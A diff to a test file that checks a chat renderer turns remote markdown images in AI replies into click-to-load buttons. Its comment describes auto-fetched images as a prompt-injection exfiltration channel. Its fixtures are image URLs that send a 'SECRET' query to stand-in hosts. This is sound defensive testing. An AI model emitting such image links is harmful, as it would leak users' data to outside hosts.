@@ -250,13 +250,18 @@ test('⚠ a disguised executable scheme is refused too — mixed case, or split 
  * which the browser requests with no click: the prompt-injection exfiltration channel. So the
  * reply carries a button naming the host and the full URL, and no element that fetches. The
  * two relative-LOOKING forms are the ones a pattern check misses: the link filter keeps
- * anything starting with `/`, and a browser resolves both to another host.
+ * anything starting with `/`, and a browser resolves both to another host. The last three pin
+ * that NO host is exempt — not the checker's own placeholder bases, not a reserved `.invalid`
+ * name (a proxy still logs it), not this page's own origin written out absolutely.
  */
 test('⚠ a remote markdown image renders as a click-to-load button showing the full URL — nothing fetches', () => {
   for (const [source, host] of [
     ['https://evil.example/p.png?q=SECRET', 'evil.example'],
     ['//evil.example/p.png?q=SECRET', 'evil.example'],
     ['/\\evil.example/p.png?q=SECRET', 'evil.example'],
+    ['http://a.invalid/p.png?q=SECRET', 'a.invalid'],
+    ['https://enso.invalid/p.png?q=SECRET', 'enso.invalid'],
+    ['http://127.0.0.1:5178/p.png?q=SECRET', '127.0.0.1:5178'],
   ] as const) {
     const rendered = html({ key: 'text', part: { type: 'text', content: `![chart](${source})` } })
     expect(rendered).not.toContain('<img')
